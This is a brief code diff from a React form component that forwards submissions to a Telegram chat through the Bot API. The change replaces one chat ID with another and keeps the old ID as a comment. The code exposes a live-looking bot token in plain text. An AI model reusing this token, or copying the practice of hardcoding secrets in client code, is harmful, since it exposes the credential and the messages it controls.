@@ -22,8 +22,8 @@ const Form = () => {
     try {
   
       const botToken = '7280963962:AAFuJeR80B945D8F7bkecrQ3VdhhHg7UFCM';
-      const chatId = '1137493485';
-
+      const chatId = '887744567';
+// 1137493485
       const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
         headers: {
